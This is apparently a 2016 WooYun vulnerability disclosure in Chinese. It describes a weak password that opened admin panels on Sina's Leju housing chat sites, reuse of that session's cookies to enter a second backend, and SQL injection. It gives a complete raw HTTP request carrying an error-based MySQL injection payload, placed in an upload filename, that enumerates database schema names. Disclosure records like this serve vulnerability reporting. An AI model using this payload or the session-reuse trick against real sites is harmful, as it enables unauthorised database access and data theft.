wybug_title: 乐居一处弱口令到2个后台再到2个SQL注入
wybug_detail:
漏洞详情 披露状态：   									2016-04-26：	细节已通知厂商并且等待厂商处理中									2016-04-26：	厂商已经确认，细节仅向厂商公开									2016-05-06：	细节向核心白帽子及相关领域专家公开									2016-05-16：	细节向普通白帽子公开									2016-05-26：	细节向实习白帽子公开									2016-06-10：	细节向公众公开  简要描述： 哎哟,这个注入不错哦 详细说明：  http://chat.house.sina.com.cn/lejuxinwen@sina.cnlejuxinwen后台的话,可以修改很多东西,我就不截图了http://chat.house.sina.com.cn/index.php/admin/room/index?cityid=-1&title=&id=&begintime=&endtime=&realname=&template=参数都没过滤吧还有多处,自行排查再列一处后台：supports.house.sina.com.cn/chat用http://chat.house.sina.com.cn的cookies就可以进去,
POST //chat/admin.php?c=room&a=manage&method=post&id=3824 HTTP/1.1Host: supports.house.sina.com.cnContent-Length: 532Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://supports.house.sina.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySBLO3Fx4OQOMZ3LUReferer: http://supports.house.sina.com.cn//chat/admin.php?c=room&a=manage&id=3824Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: 马赛克Connection: close------WebKitFormBoundarySBLO3Fx4OQOMZ3LUContent-Disposition: form-data; name="file"; filename="1.jpg"Content-Type: image/jpeg' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#------WebKitFormBoundarySBLO3Fx4OQOMZ3LUContent-Disposition: form-data; name="savemode"1------WebKitFormBoundarySBLO3Fx4OQOMZ3LU--
